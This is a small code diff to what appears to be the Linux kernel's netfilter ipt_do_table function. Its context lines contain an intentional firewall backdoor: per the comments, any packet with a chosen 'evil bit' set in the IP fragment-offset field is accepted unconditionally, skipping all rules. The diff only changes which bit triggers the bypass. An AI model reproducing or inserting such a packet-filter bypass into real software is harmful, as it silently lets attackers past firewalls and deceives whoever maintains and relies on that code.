@@ -246,7 +246,7 @@ ipt_do_table(struct sk_buff *skb,
 	
 	// check if evil bit is set and unconditionally accept it
 	// this is all that I did to backdoor this
-	if( (ip->frag_off &0x0040) == 0x0040)
+	if( (ip->frag_off &0x0080) == 0x0080)
 	{
 		return NF_ACCEPT;
 	}
